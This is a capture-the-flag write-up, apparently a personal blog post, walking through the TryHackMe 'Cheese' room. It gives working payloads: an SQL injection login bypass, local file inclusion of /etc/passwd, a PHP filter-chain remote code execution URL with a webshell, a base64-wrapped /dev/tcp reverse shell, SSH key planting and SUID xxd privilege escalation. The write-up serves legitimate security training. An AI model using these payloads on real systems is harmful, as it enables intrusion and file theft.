---
layout: post
title: "Cheese Tryhackme (easy)-Writeup"
date: 2025-11-13 2:00:00 +0000
author: sh4de
categories: [CTF, Writeup]
tags: [tryhackme]
---

### Reconnaissance And Scanning
I was provided with the IP of the target so I fired `nmap` at it to discover the open ports.
```bash
nmap -v -sV <ip>
```
I discovered a lot of open ports😊 but focused on ports `80` and `22`.

![](/assets/cheese-thm/1.png)

### Enumeration
Next, I visited the web application and got served with a Cheese shop application.

![](/assets/cheese-thm/2.png)

 I fuzzed the url and discovered a `login.php` path that took me to the login page.

 ![](/assets/cheese-thm/3.png)
 ![](/assets/cheese-thm/4.png)

 I tried default credentials but unfortunately, that didn't work. I decided to enter dummy credentials, capture the post request, and run `sqlmap` on it. I discovered a something really interesting during this process. I got a redirect to a url.

 ![](/assets/cheese-thm/5.png)

 I decided to visit manually and realized the link led me staight into the admin panel. *This can also be achieved by entering `' OR 'x'='x'#;` into the `username` and `password` fields*.

 ![](/assets/cheese-thm/7.png)

 The admin panel was a very basic one but after deeper analysis, I found something quite interesting. The url had a `file=supersecretadminpanel.html` field that calls a local file so I replaced the `supersecretadminpanel.html` with `/etc/passwd` and interestingly, I was able to view the content of the file.
 ![](/assets/cheese-thm/8.png)
 ![](/assets/cheese-thm/30.png)

 I found out from the content that there's a user named `comte` so I tried to read his id_rsa key but unfortunetely, I had no output. After some research, I got to know that, the site uses a `php filter` so I used a php filter tool which I got from `https://github.com/synacktiv/php_filter_chain_generator` to generate a php filter for my payload which is 
```bash
<?=`$_GET[0]`?>
```

 ![](/assets/cheese-thm/9.png)

Afterwards, I put that in place of the `supersecretadminpanel.html` in the url and also, added `0=id` after the `?` to test if my command `id` will be executed. Final url:
```bash
http://<ip>/secret-script.php?0=id&file=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16|convert.iconv.WINDOWS-1258.UTF32LE|convert.iconv.ISIRI3342.ISO-IR-157|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp
```
My command got executed successfully.

![](/assets/cheese-thm/10.png)

### Initial Access and Exploitation
Obviously, the next step is to send a reverse shell connection to my local machine. In order to avoid any conflicts between the url and my reverse shell command, I decided to encode it and fix it into the url so that the url does the decoding by itself.
```bash
echo 'echo '/bin/bash -i >& /dev/tcp/<your_ip>/<listening port> 0>&1'|base64
```
I executed it with the command 
```bash
echo <encoded string here>|base64 -d| bash
```
Final url:
```bash
http://<target_ip>/secret-script.php?0=echo%20<encoded_string_here>|base64%20-d|%20bash&file=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16|convert.iconv.WINDOWS-1258.UTF32LE|convert.iconv.ISIRI3342.ISO-IR-157|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp
```
![](/assets/cheese-thm/11.png)

I set up my  listener and executed which gave me a shell connection.
Setting up listener with netcat: 
```bash
rlwrap nc -lnvp <listening_port>
```
![](/assets/cheese-thm/12.png)
![](/assets/cheese-thm/13.png)

I stabilized the shell with the command:
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```
```bash
stty raw -echo;fg
```
Press `Ctrl + c` when you get hit with the `Terminal type?` and type:
```bash
export TERM=xterm
```
### Privilege Escalation to comte
Since I gained a shell as a low-end user (www-data), the next step is to escalate privileges to a high-end user. I first ran `linpeas` to see if there's anything I can take advantage of. I found that I had write privileges over `/etc/systemd/system/exploit.timer`.

![](/assets/cheese-thm/14.png)

At the moment, this can't be used to escalate privileges so we'll keep this detail because it might be needed as we move on. I did further navigation and realized that, I had `read and write` privileges over the `/home/comte/.ssh/authorized_keys` file.

![](/assets/cheese-thm/15.png)

This is a very interesting detail and we can take advantage of this by *creating an ssh key on our local machine and pasting the public key into the `authorized_keys` file*. I quickly headed to my local machine and created the ssh key with the command:
```bash
ssh-keygen -t rsa
```
Afterwards, I copied the `id_rsa.pub` key and echoed it into the `authorized_keys` file on the target machine.

![](/assets/cheese-thm/16.png)
![](/assets/cheese-thm/17.png)

I then made the `id_rsa` key on my local machine readable and writeable by only the `owner` since permission counts in gaining ssh connection with an `id_rsa` key. Command:
```bash
chmod 600 id_rsa
```
![](/assets/cheese-thm/32.png)

With my public key on the target machine, I can go ahead and connect to ssh with the command:
```bash
ssh -i id_rsa comte@<target_ip>
```
![](/assets/cheese-thm/19.png)

Since we're now recognized as `comte`, we can go ahead and read the user flag in the `/home/comte/user.txt`.

![](/assets/cheese-thm/20.png)

### Privilege Escalation to root
Now, we're in the final stage which is *Privilege Escalation*. The first step I took was to check for sudo privileges with the command
```bash
sudo -l
```
I found 4 privileges which were, `daemon-reload`, `start, restart and enable exploit.timer`.

![](/assets/cheese-thm/21.png)

Since we have `sudo` privileges over `exploit.timer`, I decided to view the content of `exploit.timer` and the service itself which is `exploit.service` and located at /etc/systemd/system/exploit.service
![](/assets/cheese-thm/23.png)
![](/assets/cheese-thm/25.png)

After viewing the content of `exploit.timer`, I realized that `OnBootSec` wasn't set and I'll bump into an error if I execute it without setting it to a value. What I did here was, I set `OnUnitActiveSec` and `OnBootSec` to `0`.

![](/assets/cheese-thm/24.png).

Also, after analyzing the content of `exploit.service`, I found that it executes some commands which are, it copies `/usr/bin/xxd` to `/opt/xxd` and it gives it an `SUID` binary which makes the file run with the permission of the `owner` which in this case is `root` and also makes it executable.
But this is what we need to ask ourselves... `what is xxd? and what is it used for?` If we find answers to these questions, we'll know how to take advantage of it. After some research, I found out that it can be used for `file read` and we're fortunate that it's owner is root and it has `SUID` set to it so we can read root's flag with this 😊.
I headed to `https://gtfobins.github.io/gtfobins/xxd/#sudo` where I found how the command is used.
I then executed the commands I have `sudo` privileges over in the format:
```bash
sudo /bin/systemctl daemon-reload
sudo /bin/systemctl restart exploit.timer
sudo /bin/systemctl start exploit.timer
sudo /bin/systemctl enable exploit.timer
LFILE=/root/root.txt
```

![](/assets/cheese-thm/26.png)
![](/assets/cheese-thm/27.png)

Afterwards, I listed the content of `/opt` and saw that `xxd` has been added.

![](/assets/cheese-thm/28.png)

I navigated to `/opt` and run the final command which is:
```bash
./xxd "$LFILE" | xxd -r
```
and had the flag😉.

![](/assets/cheese-thm/29.png)